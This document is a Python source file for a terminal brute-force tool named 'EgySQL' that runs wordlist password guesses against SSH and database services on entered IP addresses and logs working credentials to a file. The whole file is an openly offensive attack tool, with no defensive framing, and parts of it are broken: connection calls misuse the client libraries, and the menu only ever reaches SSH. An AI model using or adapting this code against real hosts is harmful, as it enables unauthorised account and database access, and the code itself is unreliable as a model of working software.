import os
import sys
import socket
import paramiko
import ftplib
import pymongo
import mysql.connector
import pyodbc
import curses

SERVICES = {
    '1': ('MongoDB', pymongo.MongoClient, 27017),
    '2': ('MySQL', mysql.connector.connect, 3306),
    '3': ('MSSQL', pyodbc.connect, 1433),
    '4': ('SQLite', None, 0),  # Placeholder for future implementation
    '5': ('SSH', paramiko.SSHClient, 22),
    '6': ('FTP', ftplib.FTP, 21),
    '7': ('RDP', None, 3389),  # Placeholder for future implementation
}

def check_port_open(host, port):
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except (socket.timeout, ConnectionRefusedError):
        return False

def read_passwords_from_file(password_list_path):
    try:
        with open(password_list_path) as f:
            return f.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Error: Password list file '{password_list_path}' not found.")
        return None

def save_successful_attempt(service, host, username, password):
    with open("successful_attempts.txt", "a") as f:
        f.write(f"Service: {service}, Host: {host}, Username: {username}, Password: {password}\n")

def execute_bruteforce(service, host, username, password, stdscr):
    try:
        client, client_port = SERVICES[service][1], SERVICES[service][2]
        if client is None:
            raise NotImplementedError(f"{SERVICES[service][0]} bruteforce is not implemented yet.")

        if not check_port_open(host, client_port):
            return False

        connection_params = {
            'host': host,
            'port': client_port,
            'username': username,
            'password': password,
            'timeout': 2
        }
        with client(**connection_params) as conn:
            if service == '1':
                databases = conn.list_database_names()
            elif service == '2':
                cursor = conn.cursor()
                cursor.execute("SHOW DATABASES")
                databases = cursor.fetchall()
                cursor.close()
            elif service == '3':
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM master.dbo.sysdatabases")
                databases = cursor.fetchall()
                cursor.close()

            # Save successful attempt to the text file
            save_successful_attempt(SERVICES[service][0], host, username, password)

            return True

    except paramiko.ssh_exception.NoValidConnectionsError:
        return False
    except paramiko.AuthenticationException:
        return False
    except paramiko.ssh_exception.SSHException:
        return False
    except Exception as e:
        return False

def bruteforce_service(service, host, username, password_list, stdscr, verbose=True):
    if not password_list:
        stdscr.addstr(2, 0, "[-] Error: No passwords provided.", curses.color_pair(1))
        stdscr.refresh()
        stdscr.getch()
        stdscr.clear()
        return

    stdscr.clear()
    stdscr.addstr(0, 0, f"[*] Starting {SERVICES[service][0]} bruteforce for {username}@{host}...", curses.color_pair(2))
    stdscr.refresh()

    if not check_port_open(host, SERVICES[service][2]):
        stdscr.addstr(2, 0, f"[-] Failed to connect to {host}:{SERVICES[service][2]}. Make sure the service is running.", curses.color_pair(1))
        stdscr.refresh()
        stdscr.getch()
        stdscr.clear()
        return

    for password in password_list:
        success = execute_bruteforce(service, host, username, password, stdscr)
        if success:
            stdscr.addstr(2, 0, f"[+] Successfully logged in with credentials: {username}:{password}", curses.color_pair(2))
            stdscr.refresh()

            # Save only the first successful attempt and then exit the loop
            break
        elif verbose:
            stdscr.addstr(2, 0, f"[-] Login failed with credentials: {username}:{password}", curses.color_pair(1))
            stdscr.refresh()

    else:
        stdscr.addstr(2, 0, "[!] Brute force attempt unsuccessful. Password not found.", curses.color_pair(1))
        stdscr.refresh()

    if verbose:
        stdscr.getch()
    stdscr.clear()

def display_message_with_delay(stdscr, message, x, y, color_pair_id, delay=1):
    stdscr.addstr(x, y, message, curses.color_pair(color_pair_id))
    stdscr.refresh()
    stdscr.getch()
    stdscr.clear()

def welcome_message(stdscr):
    stdscr.addstr(0, 0, "Welcome to EgySQL - The Ultimate Multi-Service Brute Force Tool\nAliElTop 1.0", curses.color_pair(3))
    stdscr.refresh()

def get_ips_or_users_from_list(stdscr, is_ip=True):
    stdscr.clear()
    item_name = "IP" if is_ip else "User"
    stdscr.addstr(0, 0, f"Enter {item_name}s (comma-separated):", curses.color_pair(4))
    stdscr.refresh()
    items = stdscr.getstr(1, 0).decode('utf-8').split(',')
    return items

def bruteforce_ip(stdscr, ip):
    stdscr.clear()
    stdscr.addstr(0, 0, f"[*] Starting bruteforce for IP: {ip}...", curses.color_pair(2))
    stdscr.refresh()

    stdscr.clear()
    stdscr.addstr(0, 0, "Enter the target username:", curses.color_pair(4))
    stdscr.refresh()
    username = stdscr.getstr(1, 0).decode('utf-8')

    stdscr.clear()
    stdscr.addstr(0, 0, "Enter the password list file path:", curses.color_pair(4))
    stdscr.refresh()
    password_list_path = stdscr.getstr(1, 0).decode('utf-8')
    password_list = read_passwords_from_file(password_list_path)

    bruteforce_service('5', ip, username, password_list, stdscr)

def bruteforce_user(stdscr, user):
    stdscr.clear()
    stdscr.addstr(0, 0, f"[*] Starting bruteforce for User: {user}...", curses.color_pair(2))
    stdscr.refresh()

    stdscr.clear()
    stdscr.addstr(0, 0, "Enter the target IP:", curses.color_pair(4))
    stdscr.refresh()
    ip = stdscr.getstr(1, 0).decode('utf-8')

    stdscr.clear()
    stdscr.addstr(0, 0, "Enter the password list file path:", curses.color_pair(4))
    stdscr.refresh()
    password_list_path = stdscr.getstr(1, 0).decode('utf-8')
    password_list = read_passwords_from_file(password_list_path)

    bruteforce_service('5', ip, user, password_list, stdscr)

def main(stdscr):
    curses.curs_set(0)
    curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_YELLOW, curses.COLOR_BLACK)

    EGY_SQL_LOGO_LINES = [
   r" _____████████████_____█████████████ ",
   r"____███████████████___███████████████",
   r"___████████████████████████████████████",
   r" ___█████████████████████████████████████",
   r"_███████████████████████████████████████",
   r" _█████████████████████████████████████████",
   r" _██████████████████████████████████████████",
   r" _███████████████████████████████████████████",
   r" ████████████████████████████████████████████",
   r" █████████████____█████████████_____█████████",
   r" ██████████______███████████______███████████",
   r" _████████_________████████_________████████",
   r" __████████_________███████_________████████",
   r" ___████████_________█████_________████████",
   r" ____████████_________███_________████████",
   r" ____████████████████████████████████████",
   r" _____█████████████████████████████████",
   r"______███████████████████████████████",
   r" _______█████████████████████████████",
   r"________██████______________███████",
   r"_________█████______________█████",
   r"__________████______________████",
   r"___________███______________███",
   r"____________██______________██",
   r"_____________█______________█",
   r"_____________________________",
                                                          
    ]

    welcome_message(stdscr)

    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, "Choose an option:", curses.color_pair(4))
        stdscr.addstr(1, 0, "1. Scan a single IP", curses.color_pair(3))
        stdscr.addstr(2, 0, "2. Scan multiple IPs from list", curses.color_pair(3))
        stdscr.addstr(3, 0, "3. Scan a single user", curses.color_pair(3))
        stdscr.addstr(4, 0, "4. Scan multiple users from list", curses.color_pair(3))
        stdscr.addstr(5, 0, "Q. Quit", curses.color_pair(3))

        # Display the logo as separate lines
        for i, line in enumerate(EGY_SQL_LOGO_LINES):
            stdscr.addstr(7 + i, 0, line, curses.color_pair(2))

        stdscr.refresh()

        choice = stdscr.getch()
        choice = chr(choice)

        if choice == '1':
            stdscr.clear()
            stdscr.addstr(0, 0, "Do you want to scan multiple IPs or just one? (M/1):", curses.color_pair(4))
            stdscr.refresh()
            multi_choice = stdscr.getch()
            is_multi_ip = multi_choice == ord('m') or multi_choice == ord('M')
            if is_multi_ip:
                ips = get_ips_or_users_from_list(stdscr, is_ip=True)
                for ip in ips:
                    bruteforce_ip(stdscr, ip)
            else:
                stdscr.clear()
                stdscr.addstr(0, 0, "Enter the target IP:", curses.color_pair(4))
                stdscr.refresh()
                ip = stdscr.getstr(1, 0).decode('utf-8')
                bruteforce_ip(stdscr, ip)

        elif choice == '2':
            ips = get_ips_or_users_from_list(stdscr, is_ip=True)
            for ip in ips:
                bruteforce_ip(stdscr, ip)

        elif choice == '3':
            stdscr.clear()
            stdscr.addstr(0, 0, "Do you want to scan multiple users or just one? (M/1):", curses.color_pair(4))
            stdscr.refresh()
            multi_choice = stdscr.getch()
            is_multi_user = multi_choice == ord('m') or multi_choice == ord('M')
            if is_multi_user:
                users = get_ips_or_users_from_list(stdscr, is_ip=False)
                for user in users:
                    bruteforce_user(stdscr, user)
            else:
                stdscr.clear()
                stdscr.addstr(0, 0, "Enter the target username:", curses.color_pair(4))
                stdscr.refresh()
                user = stdscr.getstr(1, 0).decode('utf-8')
                bruteforce_user(stdscr, user)

        elif choice == '4':
            users = get_ips_or_users_from_list(stdscr, is_ip=False)
            for user in users:
                bruteforce_user(stdscr, user)

        elif choice.lower() == 'q':
            display_message_with_delay(stdscr, "Exiting...", 1, 20, 5, delay=2)
            sys.exit()

        else:
            display_message_with_delay(stdscr, "Invalid choice. Try again...", 1, 20, 5, delay=2)

if __name__ == "__main__":
    curses.wrapper(main)
